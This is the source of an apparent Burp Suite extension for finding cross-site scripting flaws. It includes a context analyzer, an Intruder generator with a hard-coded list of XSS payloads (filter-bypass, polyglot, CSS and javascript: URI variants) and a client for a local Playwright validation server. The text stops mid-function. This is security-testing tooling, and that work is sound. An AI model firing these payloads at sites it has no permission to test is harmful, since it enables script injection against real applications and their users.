#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Modern XSS Validator Burp Suite Extension

This extension provides enhanced XSS detection capabilities by integrating with
a Playwright-based server for dynamic analysis of HTTP responses.

Features:
- Multi-browser testing support
- Enhanced XSS detection with confidence scoring
- Automatic payload insertion from Intruder
- Real-time validation of JavaScript execution
- Comprehensive reporting with severity levels
- Performance optimizations for high-volume testing

Author: XSS Validator Team
Version: 2.0
"""

from burp import IBurpExtender, ITab, IHttpListener, IContextMenuFactory, IMessageEditorController, \
    IIntruderPayloadGeneratorFactory, IIntruderPayloadGenerator, IParameter
from java.awt import Component, Dimension, BorderLayout, FlowLayout, GridBagLayout, GridBagConstraints, Insets
from javax.swing import JPanel, JLabel, JTextField, JButton, JCheckBox, JComboBox, JTextArea, JScrollPane
from javax.swing import JTable, JTabbedPane, JSplitPane, JOptionPane, SwingUtilities, BorderFactory
from javax.swing.table import DefaultTableModel, TableCellRenderer
from java.net import URL
from java.lang import Exception, Thread, Runnable
import threading
import json
import base64
import time
import urllib2
import urllib
import re


class ContextAnalyzer:
    """Analyzes injection point context for intelligent payload generation"""

    def __init__(self, extender):
        self._extender = extender

    def analyze_position(self, request, start_pos, end_pos):
        """Analyze the context of an injection point"""
        try:
            request_str = self._extender._helpers.bytesToString(request)

            # Extract context around the injection point
            context_start = max(0, start_pos - 100)
            context_end = min(len(request_str), end_pos + 100)
            context_str = request_str[context_start:context_end]

            # Determine the type of context
            before_injection = request_str[context_start:start_pos]
            after_injection = request_str[end_pos:context_end]

            # Check for comment contexts first (highest priority)
            comment_context = self._check_comment_context(before_injection, after_injection)
            if comment_context:
                return comment_context

            # Check for CSS context
            if self._is_css_context(before_injection, after_injection):
                return self._analyze_css_context(before_injection, after_injection)

            # Check for HTML attribute context
            if self._is_attribute_context(before_injection, after_injection):
                return self._analyze_attribute_context(before_injection, after_injection)

            # Check for JavaScript context
            elif self._is_javascript_context(before_injection, after_injection):
                return self._analyze_javascript_context(before_injection, after_injection)

            # Check for URL context
            elif self._is_url_context(before_injection):
                return {"type": "url"}

            # Default HTML context
            else:
                return {"type": "html"}

        except Exception as e:
            print("[XSS Validator] Error analyzing context: {}".format(str(e)))
            return {"type": "unknown"}

    def _check_comment_context(self, before, after):
        """Check if injection point is within any type of comment"""
        # HTML comment
        if "<!--" in before and "-->" in after:
            return {"type": "comment", "comment_type": "html"}

        # JavaScript single-line comment
        if "//" in before and "\n" in after:
            return {"type": "comment", "comment_type": "javascript_single"}

        # JavaScript multi-line comment
        if "/*" in before and "*/" in after:
            return {"type": "comment", "comment_type": "javascript_multi"}

        # CSS comment (same as JS multi-line)
        if "/*" in before and "*/" in after and self._is_likely_css(before):
            return {"type": "comment", "comment_type": "css"}

        return None

    def _is_likely_css(self, text):
        """Check if the context is likely CSS based on common patterns"""
        css_indicators = ["{", "}", ":", ";", "style", ".class", "#id",
                          "color", "background", "font", "margin", "padding"]
        return any(indicator in text.lower() for indicator in css_indicators)

    def _is_css_context(self, before, after):
        """Check if injection point is within CSS context"""
        # Check for style attribute
        import re
        style_attr_pattern = r'style\s*=\s*["\']?[^"\']*$'
        if re.search(style_attr_pattern, before.lower()):
            return True

        # Check for <style> tag
        if "<style" in before.lower() and "</style>" in after.lower():
            return True

        # Check for CSS file context (based on common CSS patterns)
        return self._is_likely_css(before + after)

    def _analyze_css_context(self, before, after):
        """Analyze the specific CSS context"""
        context = {"type": "css"}

        # Check if we're in a style attribute
        import re
        if re.search(r'style\s*=\s*["\']?[^"\']*$', before.lower()):
            context["css_type"] = "attribute"
            # Detect quote type for style attribute
            if before.endswith("'"):
                context["quote_type"] = "single"
            elif before.endswith('"'):
                context["quote_type"] = "double"
            else:
                context["quote_type"] = "none"
        else:
            context["css_type"] = "block"

        # Check if we're inside a property value
        if ":" in before.split("{")[-1] and ";" not in before.split(":")[-1]:
            context["position"] = "property_value"
        else:
            context["position"] = "general"

        return context

    def _detect_encoding(self, text):
        """Detect encoding in the text"""
        encodings = []

        # URL encoding detection
        import re
        if re.search(r'%[0-9a-fA-F]{2}', text):
            encodings.append("url")

        # HTML entity detection
        if re.search(r'&[a-zA-Z]+;|&#[0-9]+;|&#x[0-9a-fA-F]+;', text):
            encodings.append("html_entity")

        # Unicode escape detection
        if re.search(r'\\u[0-9a-fA-F]{4}|\\x[0-9a-fA-F]{2}', text):
            encodings.append("unicode")

        # Base64 detection (simple heuristic)
        if re.search(r'^[A-Za-z0-9+/]{4,}={0,2}$', text.strip()):
            encodings.append("base64")

        return encodings

    def _is_attribute_context(self, before, after):
        """Check if injection point is within an HTML attribute"""
        # Simplified check - looks for attribute patterns
        import re
        # Fixed regex pattern - properly escaped and completed
        attr_pattern = r'<[^>]+\s+\w+=["\']?[^"\']*$'
        return bool(re.search(attr_pattern, before))

    def _is_javascript_context(self, before, after):
        """Check if injection point is within JavaScript code"""
        # Check for script tags or JavaScript patterns
        return "<script" in before.lower() or "javascript:" in before.lower()

    def _is_url_context(self, before):
        """Check if injection point is within a URL"""
        # Check for URL patterns
        url_indicators = ["href=", "src=", "action=", "data="]
        return any(indicator in before.lower() for indicator in url_indicators)

    def _analyze_attribute_context(self, before, after):
        """Analyze the specific attribute context"""
        context = {"type": "attribute"}

        # Detect quote type
        if before.endswith("'"):
            context["quote_type"] = "single"
        elif before.endswith('"'):
            context["quote_type"] = "double"
        else:
            context["quote_type"] = "none"

        # Try to detect attribute name
        import re
        attr_match = re.search(r'(\w+)=["\']?[^"\']*$', before)
        if attr_match:
            context["attribute_name"] = attr_match.group(1)

        # Add encoding detection
        context["encodings"] = self._detect_encoding(before + after)

        return context

    def _analyze_javascript_context(self, before, after):
        """Analyze the specific JavaScript context"""
        context = {"type": "javascript"}

        # Detect string context
        if before.endswith("'"):
            context["string_type"] = "single"
        elif before.endswith('"'):
            context["string_type"] = "double"
        else:
            context["string_type"] = "none"

        # Add encoding detection
        context["encodings"] = self._detect_encoding(before + after)

        return context


class XSSPayloadGenerator(IIntruderPayloadGenerator):
    """Context-aware XSS payload generator for Intruder"""

    def __init__(self, extender, attack):
        self._extender = extender
        self._attack = attack
        self._payload_index = 0
        self._base_payloads = self._load_base_payloads()
        self._context_payloads = []
        self._analyzed_contexts = set()

        # Analyze the attack base request for context
        self._analyze_attack_context()

    def _load_base_payloads(self):
        """Load base XSS payloads with categorization"""
        return [
            # Basic payloads
            {"payload": "<script>alert('XSS')</script>", "category": "basic", "priority": 1},
            {"payload": "<img src=x onerror=alert('XSS')>", "category": "basic", "priority": 1},
            {"payload": "<svg onload=alert('XSS')>", "category": "basic", "priority": 1},

            # Event handler payloads
            {"payload": "javascript:alert('XSS')", "category": "javascript_uri", "priority": 2},
            {"payload": "' onmouseover='alert(1)' x='", "category": "event_handler", "priority": 2},
            {"payload": '" onmouseover="alert(1)" x="', "category": "event_handler", "priority": 2},

            # Attribute breaking payloads
            {"payload": "'><script>alert('XSS')</script>", "category": "tag_breaking", "priority": 3},
            {"payload": '"><script>alert("XSS")</script>', "category": "tag_breaking", "priority": 3},
            {"payload": "'>alert('XSS')<'", "category": "tag_breaking", "priority": 3},

            # Filter bypass payloads
            {"payload": "<sCrIpT>alert('XSS')</sCrIpT>", "category": "case_bypass", "priority": 4},
            {"payload": "<script>alert(String.fromCharCode(88,83,88))</script>", "category": "encoding_bypass",
             "priority": 4},
            {"payload": "<<script>alert('XSS');//<</script>", "category": "nested_bypass", "priority": 4},

            # Advanced payloads
            {"payload": "<iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'>", "category": "advanced",
             "priority": 5},
            {"payload": "<object data='data:text/html,<script>alert(1)</script>'>", "category": "advanced",
             "priority": 5},
            {"payload": "<embed src='data:text/html,<script>alert(1)</script>'>", "category": "advanced",
             "priority": 5},

            # Polyglot payloads
            {
                "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
                "category": "polyglot", "priority": 6}
        ]

    def _analyze_attack_context(self):
        """Analyze the attack context to generate context-aware payloads"""
        try:
            # Get the base request info
            base_request = self._attack.getBaseRequestResponse()
            if not base_request:
                return

            request_info = self._extender._helpers.analyzeRequest(base_request)

            # Get insertion points
            insertion_points = self._attack.getPayloadPositions()

            # Store attack metadata for later validation
            self._attack_metadata = {
                'url': str(request_info.getUrl()),
                'insertion_points': insertion_points,
                'request_info': request_info
            }

            # Analyze each insertion point context
            for position in insertion_points:
                context = self._extender._context_analyzer.analyze_position(
                    base_request.getRequest(),
                    position[0],
                    position[1]
                )

                # Generate context-specific payloads
                context_key = str(context)
                if context and context_key not in self._analyzed_contexts:
                    self._analyzed_contexts.add(context_key)
                    context_specific = self._generate_context_payloads(context)
                    self._context_payloads.extend(context_specific)

        except Exception as e:
            print("[XSS Validator] Error analyzing attack context: {}".format(str(e)))

    def _generate_context_payloads(self, context):
        """Generate payloads specific to the detected context"""
        payloads = []

        # HTML attribute context
        if context.get('type') == 'attribute':
            attr_name = context.get('attribute_name', '')
            quote_type = context.get('quote_type', '')

            if quote_type == 'single':
                payloads.extend([
                    {"payload": "' onmouseover='alert(1)' x='", "category": "context_attribute", "priority": 1},
                    {"payload": "' autofocus onfocus='alert(1)' x='", "category": "context_attribute", "priority": 1}
                ])
            elif quote_type == 'double':
                payloads.extend([
                    {"payload": '" onmouseover="alert(1)" x="', "category": "context_attribute", "priority": 1},
                    {"payload": '" autofocus onfocus="alert(1)" x="', "category": "context_attribute", "priority": 1}
                ])
            else:
                payloads.extend([
                    {"payload": " onmouseover=alert(1) x=", "category": "context_attribute", "priority": 1},
                    {"payload": " autofocus onfocus=alert(1) x=", "category": "context_attribute", "priority": 1}
                ])

        # JavaScript context
        elif context.get('type') == 'javascript':
            string_type = context.get('string_type', '')

            if string_type == 'single':
                payloads.extend([
                    {"payload": "';alert(1);//", "category": "context_javascript", "priority": 1},
                    {"payload": "'+alert(1)+'", "category": "context_javascript", "priority": 1}
                ])
            elif string_type == 'double':
                payloads.extend([
                    {"payload": '";alert(1);//', "category": "context_javascript", "priority": 1},
                    {"payload": '"+alert(1)+"', "category": "context_javascript", "priority": 1}
                ])
            else:
                payloads.extend([
                    {"payload": ";alert(1);//", "category": "context_javascript", "priority": 1},
                    {"payload": ",alert(1),", "category": "context_javascript", "priority": 1}
                ])

        # CSS context
        elif context.get('type') == 'css':
            if context.get('css_type') == 'attribute':
                if context.get('quote_type') == 'single':
                    payloads.extend([
                        {"payload": "';color:expression(alert(1))//", "category": "context_css", "priority": 1},
                        {"payload": "'+alert(1)+'", "category": "context_css", "priority": 1}
                    ])
                elif context.get('quote_type') == 'double':
                    payloads.extend([
                        {'payload': '";color:expression(alert(1))//', "category": "context_css", "priority": 1},
                        {'payload': '"+alert(1)+"', "category": "context_css", "priority": 1}
                    ])
                else:
                    payloads.extend([
                        {"payload": "color:expression(alert(1))//", "category": "context_css", "priority": 1},
                        {"payload": ",alert(1),", "category": "context_css", "priority": 1}
                    ])
            else:
                payloads.extend([
                    {"payload": "color:expression(alert(1))//", "category": "context_css", "priority": 1},
                    {"payload": "background:url(javascript:alert(1))", "category": "context_css", "priority": 1}
                ])

        # URL context
        elif context.get('type') == 'url':
            payloads.extend([
                {"payload": "javascript:alert(1)", "category": "context_url", "priority": 1},
                {"payload": "data:text/html,<script>alert(1)</script>", "category": "context_url", "priority": 1}
            ])

        # Try to get additional payloads from server
        server_payloads = self._get_server_payloads(context)
        payloads.extend(server_payloads)

        return payloads

    def _get_server_payloads(self, context):
        """Request context-specific payloads from the server"""
        try:
            # Check if server payload generation is enabled
            if not self._extender._config.get('server_payload_generation', True):
                return []

            server_url = "http://{}:{}/generate-payloads".format(
                self._extender._config['server_host'],
                self._extender._config['server_port']
            )

            request_data = {
                'context': json.dumps(context),
                'limit': 10  # Limit server-generated payloads
            }

            data = urllib.urlencode(request_data)
            req = urllib2.Request(server_url, data)
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
            req.add_header('User-Agent', 'Burp XSS Validator Extension')

            response = urllib2.urlopen(req, timeout=5)
            result = json.loads(response.read())

            # Convert server response to payload format
            server_payloads = []
            for p in result.get('payloads', []):
                server_payloads.append({
                    "payload": p.get('payload', ''),
                    "category": "server_generated",
                    "priority": p.get('priority', 5)
                })

            return server_payloads

        except Exception as e:
            print("[XSS Validator] Failed to get server payloads: {}".format(str(e)))
            return []

    def hasMorePayloads(self):
        """Check if there are more payloads to generate"""
        total_payloads = len(self._base_payloads) + len(self._context_payloads)
        return self._payload_index < total_payloads

    def getNextPayload(self, base_value):
        """Get the next payload, potentially mutated based on context"""
        if not self.hasMorePayloads():
            return None

        # Get payload from appropriate list
        if self._payload_index < len(self._context_payloads):
            payload_info = self._context_payloads[self._payload_index]
        else:
            base_index = self._payload_index - len(self._context_payloads)
            payload_info = self._base_payloads[base_index]

        self._payload_index += 1

        # Apply mutations if enabled
        if self._extender._config.get('payload_mutation'):
            payload = self._mutate_payload(payload_info['payload'], base_value)
        else:
            payload = payload_info['payload']

        # Store payload mapping for later validation
        attack_id = id(self._attack)
        if attack_id not in self._extender._intruder_payloads:
            self._extender._intruder_payloads[attack_id] = {}
        self._extender._intruder_payloads[attack_id][payload] = {
            'category': payload_info.get('category', 'unknown'),
            'priority': payload_info.get('priority', 5),
            'original_payload': payload_info['payload'],
            'base_value': base_value,
            'metadata': self._attack_metadata
        }

        return payload

    def _mutate_payload(self, payload, base_value):
        """Apply context-aware mutations to the payload"""
        # Simple mutations for now - can be enhanced
        mutations = [
            payload,  # Original
            payload.replace("'", "\\'"),  # Escaped single quotes
            payload.replace('"', '\\"'),  # Escaped double quotes
            payload.replace("<", "&lt;").replace(">", "&gt;"),  # HTML entities
            payload.replace("<", "%3C").replace(">", "%3E"),  # URL encoding
        ]

        # Return the most appropriate mutation
        # This is simplified - real implementation would analyze the context
        return mutations[0]

    def reset(self):
        """Reset the generator"""
        self._payload_index = 0
        self._context_payloads = []
        self._analyzed_contexts = set()
        self._analyze_attack_context()


class BurpExtender(IBurpExtender, ITab, IHttpListener, IContextMenuFactory, IMessageEditorController,
                   IIntruderPayloadGeneratorFactory):
    """Main Burp extension class implementing all required interfaces"""

    def registerExtenderCallbacks(self, callbacks):
        """Initialize and register the extension with Burp Suite"""
        # Initialize extension
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()

        # Set extension name
        callbacks.setExtensionName("Modern XSS Validator")

        # Initialize configuration
        self._config = {
            'server_host': '127.0.0.1',
            'server_port': '8093',
            'default_browser': 'chromium',
            'auto_test': False,
            'test_timeout': 30,
            'confidence_threshold': 0.5,
            'enabled_browsers': ['chromium', 'firefox', 'webkit'],
            'payload_injection': True,
            'show_all_results': False,
            'context_aware_payloads': True,
            'payload_mutation': True,
            'server_payload_generation': True  # Add server payload generation flag
        }

        # Initialize data structures
        self._results_lock = threading.Lock()
        self._results = []
        self._scan_queue = []
        self._processing = False
        self._payload_cache = {}
        self._context_analyzer = ContextAnalyzer(self)
        self._intruder_payloads = {}  # Track payloads generated for Intruder
        self._intruder_lock = threading.Lock()

        # Create UI
        self._create_ui()

        # Register callbacks
        callbacks.registerHttpListener(self)
        callbacks.registerContextMenuFactory(self)
        callbacks.registerIntruderPayloadGeneratorFactory(self)

        # Add extension tab
        callbacks.addSuiteTab(self)

        print("[XSS Validator] Modern XSS Validator extension loaded successfully")
        print("[XSS Validator] Version: 2.0")
        print("[XSS Validator] Server: {}:{}".format(self._config['server_host'], self._config['server_port']))
        print("[XSS Validator] Intruder payload generator registered")

    def _create_ui(self):
        """Create the main extension UI"""
        # Main panel
        self._main_panel = JPanel(BorderLayout())

        # Create tabbed pane
        self._tabs = JTabbedPane()

        # Configuration tab
        self._config_panel = self._create_config_panel()
        self._tabs.addTab("Configuration", self._config_panel)

        # Results tab
        self._results_panel = self._create_results_panel()
        self._tabs.addTab("Results", self._results_panel)

        # Scanner tab
        self._scanner_panel = self._create_scanner_panel()
        self._tabs.addTab("Scanner", self._scanner_panel)

        # Add tabs to main panel
        self._main_panel.add(self._tabs, BorderLayout.CENTER)

        # Status panel
        self._status_panel = self._create_status_panel()
        self._main_panel.add(self._status_panel, BorderLayout.SOUTH)

    def _create_scanner_panel(self):
        """Create manual scanner panel"""
        panel = JPanel(BorderLayout())

        # Input panel
        input_panel = JPanel(GridBagLayout())
        input_panel.setBorder(BorderFactory.createTitledBorder("Manual Testing"))

        gbc = GridBagConstraints()
        gbc.insets = Insets(5, 5, 5, 5)
        gbc.anchor = GridBagConstraints.WEST

        # URL input
        gbc.gridx, gbc.gridy = 0, 0
        input_panel.add(JLabel("URL:"), gbc)
        gbc.gridx = 1
        gbc.fill = GridBagConstraints.HORIZONTAL
        gbc.weightx = 1.0
        self._manual_url_field = JTextField(50)
        input_panel.add(self._manual_url_field, gbc)

        # Payload input
        gbc.gridx, gbc.gridy = 0, 1
        gbc.fill = GridBagConstraints.NONE
        gbc.weightx = 0
        input_panel.add(JLabel("Payload:"), gbc)
        gbc.gridx = 1
        gbc.fill = GridBagConstraints.HORIZONTAL
        gbc.weightx = 1.0
        self._manual_payload_field = JTextField("<script>alert('XSS')</script>", 50)
        input_panel.add(self._manual_payload_field, gbc)

        # Browser selection
        gbc.gridx, gbc.gridy = 0, 2
        gbc.fill = GridBagConstraints.NONE
        gbc.weightx = 0
        input_panel.add(JLabel("Browser:"), gbc)
        gbc.gridx = 1
        self._manual_browser_combo = JComboBox(['chromium', 'firefox', 'webkit'])
        input_panel.add(self._manual_browser_combo, gbc)

        # Test button
        gbc.gridx, gbc.gridy = 0, 3
        gbc.gridwidth = 2
        gbc.fill = GridBagConstraints.NONE
        gbc.anchor = GridBagConstraints.CENTER
        self._manual_test_btn = JButton("Test for XSS", actionPerformed=self._manual_test)
        input_panel.add(self._manual_test_btn, gbc)

        # Response area
        self._manual_response_area = JTextArea(15, 60)
        self._manual_response_area.setEditable(False)
        response_scroll = JScrollPane(self._manual_response_area)
        response_scroll.setBorder(BorderFactory.createTitledBorder("Response"))

        panel.add(input_panel, BorderLayout.NORTH)
        panel.add(response_scroll, BorderLayout.CENTER)

        return panel

    def _create_status_panel(self):
        """Create status panel"""
        panel = JPanel(FlowLayout(FlowLayout.LEFT))

        self._status_label = JLabel("Ready")
        panel.add(JLabel("Status: "))
        panel.add(self._status_label)

        self._processed_label = JLabel("0")
        panel.add(JLabel(" | Processed: "))
        panel.add(self._processed_label)

        self._vulnerabilities_label = JLabel("0")
        panel.add(JLabel(" | Vulnerabilities: "))
        panel.add(self._vulnerabilities_label)

        return panel

    def _create_results_panel(self):
        """Create results display panel"""
        panel = JPanel(BorderLayout())

        # Results table
        self._results_model = DefaultTableModel()
        self._results_model.addColumn("Timestamp")
        self._results_model.addColumn("URL")
        self._results_model.addColumn("Method")
        self._results_model.addColumn("Payload")
        self._results_model.addColumn("Browser")
        self._results_model.addColumn("Severity")
        self._results_model.addColumn("Confidence")
        self._results_model.addColumn("Detection Methods")
        self._results_model.addColumn("Status")

        self._results_table = JTable(self._results_model)
        self._results_table.setAutoResizeMode(JTable.AUTO_RESIZE_ALL_COLUMNS)

        # Custom cell renderer for severity
        self._results_table.getColumn("Severity").setCellRenderer(SeverityCellRenderer())

        results_scroll = JScrollPane(self._results_table)
        results_scroll.setPreferredSize(Dimension(800, 300))

        # Control panel
        control_panel = JPanel(FlowLayout())

        self._clear_results_btn = JButton("Clear Results", actionPerformed=self._clear_results)
        control_panel.add(self._clear_results_btn)

        self._export_results_btn = JButton("Export Results", actionPerformed=self._export_results)
        control_panel.add(self._export_results_btn)

        self._show_all_cb = JCheckBox("Show all results", self._config['show_all_results'],
                                      itemStateChanged=self._toggle_show_all)
        control_panel.add(self._show_all_cb)

        # Results details
        self._details_area = JTextArea(10, 50)
        self._details_area.setEditable(False)
        details_scroll = JScrollPane(self._details_area)
        details_scroll.setBorder(BorderFactory.createTitledBorder("Details"))

        # Split pane
        split_pane = JSplitPane(JSplitPane.VERTICAL_SPLIT, results_scroll, details_scroll)
        split_pane.setDividerLocation(300)
        split_pane.setResizeWeight(0.7)

        panel.add(control_panel, BorderLayout.NORTH)
        panel.add(split_pane, BorderLayout.CENTER)

        return panel

    def _create_config_panel(self):
        """Create configuration panel"""
        panel = JPanel(GridBagLayout())
        gbc = GridBagConstraints()
        gbc.insets = Insets(5, 5, 5, 5)
        gbc.anchor = GridBagConstraints.WEST

        # Server configuration
        server_panel = JPanel(BorderLayout())
        server_panel.setBorder(BorderFactory.createTitledBorder("Server Configuration"))

        server_config = JPanel(GridBagLayout())

        # Host
        gbc.gridx, gbc.gridy = 0, 0
        server_config.add(JLabel("Host:"), gbc)
        gbc.gridx = 1
        self._host_field = JTextField(self._config['server_host'], 15)
        server_config.add(self._host_field, gbc)

        # Port
        gbc.gridx, gbc.gridy = 0, 1
        server_config.add(JLabel("Port:"), gbc)
        gbc.gridx = 1
        self._port_field = JTextField(self._config['server_port'], 15)
        server_config.add(self._port_field, gbc)

        # Test connection button
        gbc.gridx, gbc.gridy = 2, 0
        gbc.gridheight = 2
        self._test_connection_btn = JButton("Test Connection", actionPerformed=self._test_connection)
        server_config.add(self._test_connection_btn, gbc)

        server_panel.add(server_config, BorderLayout.CENTER)

        # Browser configuration
        browser_panel = JPanel(BorderLayout())
        browser_panel.setBorder(BorderFactory.createTitledBorder("Browser Configuration"))

        browser_config = JPanel(GridBagLayout())
        gbc = GridBagConstraints()
        gbc.insets = Insets(5, 5, 5, 5)
        gbc.anchor = GridBagConstraints.WEST

        # Default browser
        gbc.gridx, gbc.gridy = 0, 0
        browser_config.add(JLabel("Default Browser:"), gbc)
        gbc.gridx = 1
        self._browser_combo = JComboBox(['chromium', 'firefox', 'webkit'])
        self._browser_combo.setSelectedItem(self._config['default_browser'])
        browser_config.add(self._browser_combo, gbc)

        # Enabled browsers checkboxes
        gbc.gridx, gbc.gridy = 0, 1
        browser_config.add(JLabel("Enabled Browsers:"), gbc)

        self._browser_checkboxes = {}
        for i, browser in enumerate(['chromium', 'firefox', 'webkit']):
            gbc.gridx = 1 + i
            self._browser_checkboxes[browser] = JCheckBox(browser, browser in self._config['enabled_browsers'])
            browser_config.add(self._browser_checkboxes[browser], gbc)

        browser_panel.add(browser_config, BorderLayout.CENTER)

        # Detection configuration
        detection_panel = JPanel(BorderLayout())
        detection_panel.setBorder(BorderFactory.createTitledBorder("Detection Configuration"))

        detection_config = JPanel(GridBagLayout())
        gbc = GridBagConstraints()
        gbc.insets = Insets(5, 5, 5, 5)
        gbc.anchor = GridBagConstraints.WEST

        # Auto test
        gbc.gridx, gbc.gridy = 0, 0
        self._auto_test_cb = JCheckBox("Auto-test responses", self._config['auto_test'])
        detection_config.add(self._auto_test_cb, gbc)

        # Payload injection
        gbc.gridx, gbc.gridy = 1, 0
        self._payload_injection_cb = JCheckBox("Inject payloads automatically", self._config['payload_injection'])
        detection_config.add(self._payload_injection_cb, gbc)

        # Context-aware payloads
        gbc.gridx, gbc.gridy = 2, 0
        self._context_aware_cb = JCheckBox("Use context-aware payloads", self._config['context_aware_payloads'])
        detection_config.add(self._context_aware_cb, gbc)

        # Payload mutation
        gbc.gridx, gbc.gridy = 3, 0
        self._mutation_cb = JCheckBox("Enable payload mutation", self._config['payload_mutation'])
        detection_config.add(self._mutation_cb, gbc)

        # Server payload generation
        gbc.gridx, gbc.gridy = 0, 3
        gbc.gridwidth = 2
        self._server_payloads_cb = JCheckBox("Request payloads from server", self._config['server_payload_generation'])
        detection_config.add(self._server_payloads_cb, gbc)

        # Confidence threshold
        gbc.gridx, gbc.gridy = 0, 4
        gbc.gridwidth = 1
        detection_config.add(JLabel("Confidence Threshold:"), gbc)
        gbc.gridx = 1
        self._confidence_field = JTextField(str(self._config['confidence_threshold']), 10)
        detection_config.add(self._confidence_field, gbc)

        # Timeout
        gbc.gridx, gbc.gridy = 0, 5
        detection_config.add(JLabel("Timeout (seconds):"), gbc)
        gbc.gridx = 1
        self._timeout_field = JTextField(str(self._config['test_timeout']), 10)
        detection_config.add(self._timeout_field, gbc)

        detection_panel.add(detection_config, BorderLayout.CENTER)

        # Save configuration button
        save_panel = JPanel(FlowLayout())
        self._save_config_btn = JButton("Save Configuration", actionPerformed=self._save_config)
        save_panel.add(self._save_config_btn)

        # Main config layout
        main_gbc = GridBagConstraints()
        main_gbc.insets = Insets(10, 10, 10, 10)
        main_gbc.fill = GridBagConstraints.HORIZONTAL
        main_gbc.weightx = 1.0

        main_gbc.gridx, main_gbc.gridy = 0, 0
        panel.add(server_panel, main_gbc)

        main_gbc.gridy = 1
        panel.add(browser_panel, main_gbc)

        main_gbc.gridy = 2
        panel.add(detection_panel, main_gbc)

        main_gbc.gridy = 3
        main_gbc.fill = GridBagConstraints.NONE
        main_gbc.anchor = GridBagConstraints.CENTER
        panel.add(save_panel, main_gbc)

        return panel

    def _test_connection(self, event):
        """Test connection to the XSS validation server"""

        def test_thread():
            try:
                self._update_status("Testing connection...")

                host = self._host_field.getText()
                port = self._port_field.getText()

                url = "http://{}:{}/health".format(host, port)
                req = urllib2.Request(url)
                req.add_header('User-Agent', 'Burp XSS Validator Extension')

                response = urllib2.urlopen(req, timeout=10)
                data = json.loads(response.read())

                if data.get('status') == 'healthy':
                    SwingUtilities.invokeLater(lambda: self._show_message(
                        "Connection successful!\n\nServer Status: {}\nAvailable Browsers: {}\nUptime: {:.1f}s".format(
                            data['status'],
                            ', '.join(data.get('availableBrowsers', [])),
                            data.get('uptime', 0)
                        ), "Connection Test", JOptionPane.INFORMATION_MESSAGE))
                else:
                    raise Exception("Server returned unhealthy status")

                self._update_status("Connection test successful")

            except Exception as e:
                SwingUtilities.invokeLater(
                    lambda: self._show_message("Connection failed: {}".format(str(e)), "Connection Error",
                                               JOptionPane.ERROR_MESSAGE))
                self._update_status("Connection test failed")

        Thread(test_thread).start()

    def _save_config(self, event):
        """Save configuration"""
        try:
            self._config['server_host'] = self._host_field.getText()
            self._config['server_port'] = self._port_field.getText()
            self._config['default_browser'] = self._browser_combo.getSelectedItem()
            self._config['auto_test'] = self._auto_test_cb.isSelected()
            self._config['payload_injection'] = self._payload_injection_cb.isSelected()
            self._config['context_aware_payloads'] = self._context_aware_cb.isSelected()
            self._config['payload_mutation'] = self._mutation_cb.isSelected()
            self._config[
                'server_payload_generation'] = self._server_payloads_cb.isSelected()  # Add server payload generation
            self._config['confidence_threshold'] = float(self._confidence_field.getText())
            self._config['test_timeout'] = int(self._timeout_field.getText())
            self._config['show_all_results'] = self._show_all_cb.isSelected()

            # Update enabled browsers
            self._config['enabled_browsers'] = []
            for browser, checkbox in self._browser_checkboxes.items():
                if checkbox.isSelected():
                    self._config['enabled_browsers'].append(browser)

            self._show_message("Configuration saved successfully!", "Success", JOptionPane.INFORMATION_MESSAGE)
            self._update_status("Configuration saved")

        except Exception as e:
            self._show_message("Failed to save configuration: {}".format(str(e)), "Error", JOptionPane.ERROR_MESSAGE)

    def _clear_results(self, event):
        """Clear all results"""
        with self._results_lock:
            self._results = []
            self._results_model.setRowCount(0)
            self._details_area.setText("")
        self._update_counters()

    def _export_results(self, event):
        """Export results to JSON"""
        try:
            with self._results_lock:
                results_copy = list(self._results)

            # Create export data
            export_data = {
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                'total_results': len(results_copy),
                'results': results_copy
            }

            # For simplicity, print to extension output (in real implementation, use file dialog)
            print("[XSS Validator] Export data:")
            print(json.dumps(export_data, indent=2))

            self._show_message("Results exported to extension output", "Export Complete",
                               JOptionPane.INFORMATION_MESSAGE)

        except Exception as e:
            self._show_message("Failed to export results: {}".format(str(e)), "Export Error", JOptionPane.ERROR_MESSAGE)

    def _toggle_show_all(self, event):
        """Toggle showing all results vs. only vulnerabilities"""
        self._config['show_all_results'] = self._show_all_cb.isSelected()
        self._refresh_results_display()

    def _manual_test(self, event):
        """Perform manual XSS test"""

        def test_thread():
            try:
                url = self._manual_url_field.getText().strip()
                payload = self._manual_payload_field.getText().strip()
                browser = self._manual_browser_combo.getSelectedItem()

                if not url or not payload:
                    SwingUtilities.invokeLater(
                        lambda: self._show_message("Please enter both URL and payload", "Input Error",
                                                   JOptionPane.WARNING_MESSAGE))
                    return

                self._update_status("Testing {} with {} browser...".format(url, browser))

                # Create mock HTTP response for testing
                response_html = """
                <html>
                <head><title>Manual Test</title></head>
                <body>
                    <h1>Manual XSS Test</h1>
                    <p>Testing payload: {}</p>
                    <div id="content">{}</div>
                </body>
                </html>
                """.format(payload, payload)

                # Test the payload
                result = self._test_xss_payload(url, response_html, payload, browser)

                SwingUtilities.invokeLater(lambda: self._manual_response_area.setText(json.dumps(result, indent=2)))
                self._update_status("Manual test completed")

            except Exception as e:
                error_msg = "Manual test failed: {}".format(str(e))
                SwingUtilities.invokeLater(lambda: self._manual_response_area.setText(error_msg))
                self._update_status("Manual test failed")

        Thread(test_thread).start()

    def _test_xss_payload(self, url, response_html, payload, browser):
        """Test a single XSS payload"""
        try:
            server_url = "http://{}:{}".format(self._config['server_host'], self._config['server_port'])

            # Prepare request data
            request_data = {
                'http-response': base64.b64encode(response_html.encode('utf-8')),
                'http-url': base64.b64encode(url.encode('utf-8')),
                'http-headers': base64.b64encode(''),
                'payload': payload,
                'browser': browser
            }

            # Send request to server
            data = urllib.urlencode(request_data)
            req = urllib2.Request(server_url, data)
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
            req.add_header('User-Agent', 'Burp XSS Validator Extension')

            response = urllib2.urlopen(req, timeout=self._config['test_timeout'])
            result = json.loads(response.read())

            # Add metadata
            result['timestamp'] = time.strftime('%Y-%m-%d %H:%M:%S')
            result['test_url'] = url
